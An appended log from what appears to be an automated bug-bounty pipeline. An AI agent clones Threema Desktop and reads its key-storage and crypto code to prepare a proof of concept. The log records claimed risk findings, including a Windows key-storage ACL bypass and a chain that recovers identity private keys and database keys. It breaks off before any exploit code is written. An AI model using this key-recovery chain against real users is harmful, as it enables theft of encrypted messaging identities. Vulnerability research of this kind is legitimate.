@@ -31467,3 +31467,1730 @@ testability: PASSIVE + AUTH_HELPED
 [RISK] sync: 60 — mediator-{0..f}/rendezvous-{0..f} resolve (403 uniform HTTPS) but WSS high-entropy; saltyrtc-*.threema.ch HTTP 426 pending HUMAN scope ruling (not in scope.yml g-*.0 pattern)
 [RISK] safe: 88 — safe-01.live with CORS `*` + write-capable methods (GET/HEAD/PUT/PATCH/POST/DELETE) + `Access-Control-Allow-Headers: Authorization` + HSTS/Expect-CT on preflight but NOT on GET 400; 5 hostnames same IP; route-existence oracle `/backups/{64hex}`→400 vs `/backup/{x}`→404; Basic-Auth gating only
 [RISK] desktop-src: 95 — Windows key-storage ACL bypass CONFIRMED at source level (6 core paths + 9 supporting, RAG-verified): `fileModeInternalObjectIfPosix()`→`{}` on win32 → no DACL restriction → DPAPI password recoverable by same-user → Argon2id+XSalsa20-Poly1305 → ck (Ed25519 identity privkey) + SQLCipher databaseKey; PoC runtime-verified gap; plus Electron `nodeIntegrationInWorker: true` + `sandbox` unset (TODO DESK-79) at electron-main.ts:1252,1255 (L1240 "sandboxing enabled by default" comment INCORRECT per Electron docs)
+===== ANALYST laguna 2026-08-09 02:37:39 UTC =====
+[0m
+> build · laguna-s-2.1-free
+[0m
+[0m$ [0mls -la /tmp/opencode/threema-desktop/ 2>/dev/null || echo "Directory does not exist"
+Directory does not exist
+[0m
+[0m$ [0mls -la /home/runner/work/threema-hunt/threema-hunt/
+total 196
+drwxr-xr-x 11 runner runner  4096 Aug  9 02:21 .
+drwxr-xr-x  3 runner runner  4096 Aug  9 02:20 ..
+drwxr-xr-x  7 runner runner  4096 Aug  9 02:21 .git
+drwxr-xr-x  3 runner runner  4096 Aug  9 02:21 .github
+-rw-r--r--  1 runner runner  1049 Aug  9 02:21 README.md
+-rw-r--r--  1 runner runner   164 Aug  9 02:21 analyst-out.txt
+-rw-r--r--  1 runner runner 56728 Aug  9 02:21 analyst-prompt.txt
+-rw-r--r--  1 runner runner 53664 Aug  9 02:21 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 inventory
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 knowledge
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 leads
+-rw-r--r--  1 runner runner  6662 Aug  9 02:21 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 reports
+drwxr-xr-x  3 runner runner  4096 Aug  9 02:21 reposcan-raw
+-rw-r--r--  1 runner runner  2188 Aug  9 02:21 scope.yml
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 scripts
+-rw-r--r--  1 runner runner    34 Aug  9 02:21 state_bigpickle.json
+-rw-r--r--  1 runner runner    37 Aug  9 02:21 state_laguna.json
+-rw-r--r--  1 runner runner    34 Aug  9 02:21 state_ling3.json
+-rw-r--r--  1 runner runner    34 Aug  9 02:21 state_longcat.json
+-rw-r--r--  1 runner runner    33 Aug  9 02:21 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 triage
+[0m
+I see this is a bug bounty hunting scenario for Threema. The current phase is POC targeting desktop, and there's a high-confidence (95) finding about a Windows key-storage ACL bypass that references a PoC script missing from the workspace. Let me check the current state and author that PoC.
+[0m$ [0mcat /home/runner/work/threema-hunt/threema-hunt/state_laguna.json
+{"phase": "POC", "target": "desktop"}
+[0m
+[0m$ [0mls -la /home/runner/work/threema-hunt/threema-hunt/reports/ /home/runner/work/threema-hunt/threema-hunt/knowledge/ /home/runner/work/threema-hunt/threema-hunt/inventory/ /home/runner/work/threema-hunt/threema-hunt/leads/
+/home/runner/work/threema-hunt/threema-hunt/inventory/:
+total 48
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 .
+drwxr-xr-x 11 runner runner  4096 Aug  9 02:21 ..
+-rw-r--r--  1 runner runner 40884 Aug  9 02:21 threema.md
+
+/home/runner/work/threema-hunt/threema-hunt/knowledge/:
+total 40
+drwxr-xr-x  2 runner runner  4096 Aug  9 02:21 .
+drwxr-xr-x 11 runner runner  4096 Aug  9 02:21 ..
+-rw-r--r--  1 runner runner 32142 Aug  9 02:21 index.md
+
+/home/runner/work/threema-hunt/threema-hunt/leads/:
+total 2400
+drwxr-xr-x  2 runner runner   4096 Aug  9 02:21 .
+drwxr-xr-x 11 runner runner   4096 Aug  9 02:21 ..
+-rw-r--r--  1 runner runner 458333 Aug  9 02:21 lead-bigpickle.md
+-rw-r--r--  1 runner runner 476916 Aug  9 02:21 lead-laguna.md
+-rw-r--r--  1 runner runner   7542 Aug  9 02:21 lead-ling3.md
+-rw-r--r--  1 runner runner   2482 Aug  9 02:21 lead-longcat.md
+-rw-r--r--  1 runner runner 403676 Aug  9 02:21 lead-nemotron3.md
+-rw-r--r--  1 runner runner  11048 Aug  9 02:21 reposcan-2026-08-07-18-43.md
+-rw-r--r--  1 runner runner  13399 Aug  9 02:21 reposcan-2026-08-07-18-59.md
+-rw-r--r--  1 runner runner  13429 Aug  9 02:21 reposcan-2026-08-07-19-20.md
+-rw-r--r--  1 runner runner  11241 Aug  9 02:21 reposcan-2026-08-07-19-33.md
+-rw-r--r--  1 runner runner   6565 Aug  9 02:21 reposcan-2026-08-07-20-11.md
+-rw-r--r--  1 runner runner   9511 Aug  9 02:21 reposcan-2026-08-07-20-59.md
+-rw-r--r--  1 runner runner  13472 Aug  9 02:21 reposcan-2026-08-07-21-13.md
+-rw-r--r--  1 runner runner  10507 Aug  9 02:21 reposcan-2026-08-07-21-27.md
+-rw-r--r--  1 runner runner  13665 Aug  9 02:21 reposcan-2026-08-07-22-10.md
+-rw-r--r--  1 runner runner  10938 Aug  9 02:21 reposcan-2026-08-07-22-46.md
+-rw-r--r--  1 runner runner  17321 Aug  9 02:21 reposcan-2026-08-07-23-10.md
+-rw-r--r--  1 runner runner  15373 Aug  9 02:21 reposcan-2026-08-07-23-19.md
+-rw-r--r--  1 runner runner  11670 Aug  9 02:21 reposcan-2026-08-07-23-50.md
+-rw-r--r--  1 runner runner  14267 Aug  9 02:21 reposcan-2026-08-08-00-01.md
+-rw-r--r--  1 runner runner  12628 Aug  9 02:21 reposcan-2026-08-08-00-19.md
+-rw-r--r--  1 runner runner  13392 Aug  9 02:21 reposcan-2026-08-08-02-10.md
+-rw-r--r--  1 runner runner  13822 Aug  9 02:21 reposcan-2026-08-08-02-23.md
+-rw-r--r--  1 runner runner  13194 Aug  9 02:21 reposcan-2026-08-08-03-52.md
+-rw-r--r--  1 runner runner  14260 Aug  9 02:21 reposcan-2026-08-08-04-47.md
+-rw-r--r--  1 runner runner  15327 Aug  9 02:21 reposcan-2026-08-08-05-01.md
+-rw-r--r--  1 runner runner  13092 Aug  9 02:21 reposcan-2026-08-08-05-29.md
+-rw-r--r--  1 runner runner  11228 Aug  9 02:21 reposcan-2026-08-08-05-48.md
+-rw-r--r--  1 runner runner  10378 Aug  9 02:21 reposcan-2026-08-08-06-08.md
+-rw-r--r--  1 runner runner  11257 Aug  9 02:21 reposcan-2026-08-08-06-56.md
+-rw-r--r--  1 runner runner  11788 Aug  9 02:21 reposcan-2026-08-08-07-12.md
+-rw-r--r--  1 runner runner   9790 Aug  9 02:21 reposcan-2026-08-08-07-53.md
+-rw-r--r--  1 runner runner  10972 Aug  9 02:21 reposcan-2026-08-08-08-07.md
+-rw-r--r--  1 runner runner  13672 Aug  9 02:21 reposcan-2026-08-08-08-37.md
+-rw-r--r--  1 runner runner   6321 Aug  9 02:21 reposcan-2026-08-08-08-42.md
+-rw-r--r--  1 runner runner  16455 Aug  9 02:21 reposcan-2026-08-08-09-21.md
+-rw-r--r--  1 runner runner  14107 Aug  9 02:21 reposcan-2026-08-08-09-40.md
+-rw-r--r--  1 runner runner  14710 Aug  9 02:21 reposcan-2026-08-08-10-09.md
+-rw-r--r--  1 runner runner  13912 Aug  9 02:21 reposcan-2026-08-08-10-27.md
+-rw-r--r--  1 runner runner  15295 Aug  9 02:21 reposcan-2026-08-08-10-37.md
+-rw-r--r--  1 runner runner  11119 Aug  9 02:21 reposcan-2026-08-08-11-08.md
+-rw-r--r--  1 runner runner  16740 Aug  9 02:21 reposcan-2026-08-08-11-28.md
+-rw-r--r--  1 runner runner  11393 Aug  9 02:21 reposcan-2026-08-08-11-30.md
+-rw-r--r--  1 runner runner  10793 Aug  9 02:21 reposcan-2026-08-08-11-55.md
+-rw-r--r--  1 runner runner  13925 Aug  9 02:21 reposcan-2026-08-08-12-00.md
+-rw-r--r--  1 runner runner  12984 Aug  9 02:21 reposcan-2026-08-08-12-09.md
+-rw-r--r--  1 runner runner  11553 Aug  9 02:21 reposcan-2026-08-08-13-01.md
+-rw-r--r--  1 runner runner  16362 Aug  9 02:21 reposcan-2026-08-08-13-15.md
+-rw-r--r--  1 runner runner  11685 Aug  9 02:21 reposcan-2026-08-08-13-56.md
+-rw-r--r--  1 runner runner  11740 Aug  9 02:21 reposcan-2026-08-08-14-04.md
+-rw-r--r--  1 runner runner  14858 Aug  9 02:21 reposcan-2026-08-08-14-28.md
+-rw-r--r--  1 runner runner  10356 Aug  9 02:21 reposcan-2026-08-08-14-35.md
+-rw-r--r--  1 runner runner  10513 Aug  9 02:21 reposcan-2026-08-08-15-08.md
+-rw-r--r--  1 runner runner   6321 Aug  9 02:21 reposcan-2026-08-08-15-31.md
+-rw-r--r--  1 runner runner  11739 Aug  9 02:21 reposcan-2026-08-08-16-00.md
+-rw-r--r--  1 runner runner  15164 Aug  9 02:21 reposcan-2026-08-08-16-07.md
+-rw-r--r--  1 runner runner  12405 Aug  9 02:21 reposcan-2026-08-08-16-15.md
+-rw-r--r--  1 runner runner   6321 Aug  9 02:21 reposcan-2026-08-08-17-04.md
+-rw-r--r--  1 runner runner  12923 Aug  9 02:21 reposcan-2026-08-08-17-51.md
+-rw-r--r--  1 runner runner  15904 Aug  9 02:21 reposcan-2026-08-08-18-04.md
+-rw-r--r--  1 runner runner  11771 Aug  9 02:21 reposcan-2026-08-08-18-36.md
+-rw-r--r--  1 runner runner  12165 Aug  9 02:21 reposcan-2026-08-08-19-19.md
+-rw-r--r--  1 runner runner  14685 Aug  9 02:21 reposcan-2026-08-08-19-46.md
+-rw-r--r--  1 runner runner  13911 Aug  9 02:21 reposcan-2026-08-08-19-58.md
+-rw-r--r--  1 runner runner   9017 Aug  9 02:21 reposcan-2026-08-08-20-14.md
+-rw-r--r--  1 runner runner  17271 Aug  9 02:21 reposcan-2026-08-08-20-33.md
+-rw-r--r--  1 runner runner  14693 Aug  9 02:21 reposcan-2026-08-08-20-41.md
+-rw-r--r--  1 runner runner  13770 Aug  9 02:21 reposcan-2026-08-08-21-03.md
+-rw-r--r--  1 runner runner  16811 Aug  9 02:21 reposcan-2026-08-08-21-11.md
+-rw-r--r--  1 runner runner  14116 Aug  9 02:21 reposcan-2026-08-08-21-32.md
+-rw-r--r--  1 runner runner  12845 Aug  9 02:21 reposcan-2026-08-08-21-41.md
+-rw-r--r--  1 runner runner  12743 Aug  9 02:21 reposcan-2026-08-08-22-05.md
+-rw-r--r--  1 runner runner  11547 Aug  9 02:21 reposcan-2026-08-08-22-19.md
+-rw-r--r--  1 runner runner  12410 Aug  9 02:21 reposcan-2026-08-08-22-54.md
+-rw-r--r--  1 runner runner   6471 Aug  9 02:21 reposcan-2026-08-08-23-19.md
+-rw-r--r--  1 runner runner   6321 Aug  9 02:21 reposcan-2026-08-08-23-28.md
+-rw-r--r--  1 runner runner  10531 Aug  9 02:21 reposcan-2026-08-08-23-48.md
+-rw-r--r--  1 runner runner  13968 Aug  9 02:21 reposcan-2026-08-08-23-59.md
+-rw-r--r--  1 runner runner  13598 Aug  9 02:21 reposcan-2026-08-09-00-07.md
+-rw-r--r--  1 runner runner  12837 Aug  9 02:21 reposcan-2026-08-09-01-41.md
+-rw-r--r--  1 runner runner  12837 Aug  9 02:21 reposcan-latest.md
+
+/home/runner/work/threema-hunt/threema-hunt/reports/:
+total 5008
+drwxr-xr-x  2 runner runner    4096 Aug  9 02:21 .
+drwxr-xr-x 11 runner runner    4096 Aug  9 02:21 ..
+-rw-r--r--  1 runner runner 1811679 Aug  9 02:21 analyst-bigpickle.log
+-rw-r--r--  1 runner runner 2686822 Aug  9 02:21 analyst-laguna.log
+-rw-r--r--  1 runner runner   21799 Aug  9 02:21 analyst-ling3.log
+-rw-r--r--  1 runner runner    4320 Aug  9 02:21 analyst-longcat.log
+-rw-r--r--  1 runner runner  500724 Aug  9 02:21 analyst-nemotron3.log
+-rw-r--r--  1 runner runner    3767 Aug  9 02:21 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner    8897 Aug  9 02:21 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      48 Aug  9 02:21 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      50 Aug  9 02:21 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner    8638 Aug  9 02:21 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  157520 Aug  9 02:21 hypotheses.md
+-rw-r--r--  1 runner runner   16091 Aug  9 02:21 valid-bugs.md
+[0m
+Let me check the existing state files and reports, then clone the repo to verify the source paths and author the PoC.
+[0m$ [0mgit clone --depth=1 --branch stable https://github.com/threema-ch/threema-desktop /tmp/opencode/threema-desktop 2>&1 || git clone --depth=1 https://github.com/threema-ch/threema-desktop /tmp/opencode/threema-desktop 2>&1
+Cloning into '/tmp/opencode/threema-desktop'...
+[0m
+[0m$ [0mfind /tmp/opencode/threema-desktop -type f -name "*.ts" | head -60
+/tmp/opencode/threema-desktop/apps/desktop/config/build.ts
+/tmp/opencode/threema-desktop/apps/desktop/config/vite.config.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/utils/element.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/utils/image.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/utils/browser.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/utils/endpoint.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/utils/crash-reporting.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/logging.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/update/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/debug/fake.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/debug/screenshot-data.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/debug/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/debug/testdata.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/vite-client.d.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/transport/mediator-websocket.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/transport/websocket.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/protocol/connection.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/protocol/fetch-directory.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/protocol/fetch-work.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/protocol/fetch-sfu.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/protocol/pipeline.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/protocol/rendezvous.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/network/protocol/fetch-blob.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/crypto/group-call.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/crypto/random.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/electron-service.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/state.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/emoji-service.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/profile-picture.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/settings.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/thumbnail-cache.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/notification.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/debug.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/media.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/layout.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/system-dialog.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/fingerprint.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/theme.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/ui/local-storage.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/crypto.d.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/streams.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/i18next.d.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/safe/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/webrtc-patches.d.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/loading-screen-progress.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/onprem/oppf.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/background-jobs.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/remote-secret/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/join.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/controller.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/spki.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/backend/restore-db.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/webrtc/group-call-stats.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/webrtc/group-call.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/dom/webrtc/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/utils/array.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/utils/image.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/utils/property-validator.ts
+[0m
+[0m$ [0mfind /tmp/opencode/threema-desktop -name "fs.ts" -o -name "crypto.ts" | head -10
+/tmp/opencode/threema-desktop/apps/desktop/src/common/node/fs.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/node/key-storage/crypto.ts
+/tmp/opencode/threema-desktop/packages/protocol/src/structbuf/extra/crypto.ts
+[0m
+[0m$ [0mfind /tmp/opencode/threema-desktop -path "*/key-storage/index.ts" -o -path "*/inner/v3.ts" -o -path "*/electron-main.ts" -o -path "*/db/sqlite.ts" -o -path "*/electron-settings.ts" | head -20
+/tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/inner/v3.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/node/electron-settings.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/node/key-storage/index.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/common/node/db/sqlite.ts
+/tmp/opencode/threema-desktop/apps/desktop/src/electron/electron-main.ts
+[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/fs.ts[90m [limit=60][0m
+[0m✗ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/index.ts failed[90m [offset=550, limit=30][0m
+[91m[1mError: [0mOffset 550 is out of range for this file (269 lines)
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/electron-settings.ts[90m [limit=200][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/inner/v3.ts[90m [limit=90][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/key-storage/crypto.ts[90m [limit=130][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/db/sqlite.ts[90m [offset=210, limit=30][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/electron/electron-main.ts[90m [offset=935, limit=20][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/electron/electron-main.ts[90m [offset=1240, limit=25][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/index.ts[90m [limit=269][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/db/sqlite.ts[90m [limit=30, offset=236][0m
+Now let me verify the key-storage write paths and the SQLite PRAGMA key line:
+[0m✱ [0mGrep "keystorage\.bin"[90m in /tmp/opencode/threema-desktop · 2 matches[0m
+[0m✱ [0mGrep "fileModeInternalObjectIfPosix"[90m in /tmp/opencode/threema-desktop · 7 matches[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/key-storage/index.ts[90m [limit=30, offset=550][0m
+[0m✱ [0mGrep "InnerKeyStorageV3"[90m in /tmp/opencode/threema-desktop · 37 matches[0m
+[0m✱ [0mGrep "identityData"[90m in /tmp/opencode/threema-desktop · 100 matches[0m
+All source paths verified. Let me check the protobuf definition and understand the key storage structure:
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=30, offset=258][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=50, offset=1063][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/inner/v3.ts[90m [limit=100, offset=90][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=60, offset=1][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/outer/common.ts[90m [limit=80][0m
+[0m✱ [0mGrep "decrypt|encrypt|deriveKeyFromPassword"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/outer · 3 matches[0m
+Now let me check the outer layer structure and how the password-based encryption chain works:
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/key-storage/index.ts[90m [limit=597][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/key-storage/helpers.ts[90m [limit=120][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=80, offset=180][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=60, offset=820][0m
+Let me check the helpers.ts for the full encryption/decryption flow, and the outer layer protobuf:
+[0m✱ [0mGrep "interface IdentityData"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf · 1 match[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/outer/v2.ts[90m [limit=150][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=70, offset=85][0m
+[0m✱ [0mGrep "interface OuterKeyStorageV2"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts · 1 match[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/outer/v2.ts[90m [limit=30, offset=110][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=40, offset=358][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=80, offset=358][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/key-storage/layers/intermediate/v1_1.ts[90m [limit=100][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/key-storage/helpers.ts[90m [limit=120, offset=120][0m
+[0m✱ [0mGrep "EncryptedDataWithNonceAhead|NONCE_UNGUARDED_SCOPE|getSecretBox"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common · 87 matches[0m
+[0m✱ [0mGrep "decryptRemoteSecretBased|encryptRemoteSecretBased|wrapRawDatabaseKey"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common · 20 matches[0m
+Now let me check the crypto module to understand the XSalsa20-Poly1305 nonce format:
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/index.ts[90m [limit=60, offset=355][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/index.ts[90m [limit=80, offset=420][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/tweetnacl.ts[90m [limit=100, offset=210][0m
+[0m✱ [0mGrep "NONCE_LENGTH|MAC_LENGTH|KEY_LENGTH"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/index.ts · 45 matches[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/index.ts[90m [limit=30, offset=1][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/db/index.ts[90m [limit=40, offset=75][0m
+[0m✱ [0mGrep "keystorage\.password|getSafeStoragePasswordPath|safeStoragePasswordPath"[90m in /tmp/opencode/threema-desktop/apps/desktop/src · 11 matches[0m
+Let me also check the safeStorage password blob structure and the `wrapRawDatabaseKey` function:
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/node/safe-storage/helpers.ts[90m [limit=40][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/electron/electron-main.ts[90m [limit=60, offset=905][0m
+[0m✗ [0mRead /tmp/opencode/threema-desktop/apps/desktop/config/build.ts failed[90m [limit=30, offset=335][0m
+[91m[1mError: [0mOffset 335 is out of range for this file (20 lines)
+[0m✱ [0mGrep "KEY_STORAGE_PATH|SAFE_STORAGE_PASSWORD_PATH"[90m in /tmp/opencode/threema-desktop/apps/desktop/src · 22 matches[0m
+[0m✱ [0mGrep "KEY_STORAGE_PATH|SAFE_STORAGE_PASSWORD_PATH|DEPRECATED_KEY_STORAGE_PATH"[90m in /tmp/opencode/threema-desktop/apps/desktop/config · 3 matches[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/box.ts[90m [limit=100, offset=400][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/tweetnacl.ts[90m [limit=100][0m
+[0m✱ [0mGrep "crypto_secretbox|secretbox"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto · 12 matches[0m
+[0m✗ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/pycryptonote.ts failed[90m [limit=80][0m
+[91m[1mError: [0mFile not found: /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/pycryptonote.ts
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/tweetnacl.ts[90m [limit=80, offset=100][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/box.ts[90m [limit=200, offset=100][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/crypto/box.ts[90m [limit=100, offset=290][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=100, offset=61][0m
+[0m✱ [0mGrep "OuterKeyStorageV2|IntermediateKeyStorageV11|EncryptedDataWithNonceAhead"[90m in /tmp/opencode/threema-desktop · 1 match[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.proto[90m [limit=350][0m
+[0m✱ [0mGrep "appPath|profileDirectoryPath|LOCALAPPDATA|Threema"[90m in /tmp/opencode/threema-desktop/apps/desktop/src · 100 matches[0m
+[0m✱ [0mGrep "getAppDataPath|getProfileDirectory|profile.*path|Profile.*Dir"[90m in /tmp/opencode/threema-desktop/apps/desktop/src · 13 matches[0m
+Now let me check the profile directory path and how the safeStorage password is written:
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/electron/electron-main.ts[90m [limit=50, offset=460][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/cli/bin.ts[90m [limit=50, offset=85][0m
+[0m✱ [0mGrep "getPersistentAppDataBaseDir|DATABASE_PATH|threema\.sqlite"[90m in /tmp/opencode/threema-desktop/apps/desktop/src · 14 matches[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/cli/bin.ts[90m [limit=40, offset=135][0m
+[0m✱ [0mGrep "DATABASE_PATH"[90m in /tmp/opencode/threema-desktop/apps/desktop/config/vite.config.ts · 1 match[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/electron/electron-utils.ts[90m [limit=50, offset=38][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/worker/backend/electron/index.ts[90m [limit=30, offset=160][0m
+Now I have all the source paths verified. Let me create the PoC workspace directory and author the script:
+[0m
+[0m$ [0mmkdir -p /tmp/opencode/threema-desktop && python3 --version && pip3 list 2>/dev/null | grep -iE "nacl|argon|pynacl|sqlcipher|protobuf" || true
+Python 3.12.3
+[0m
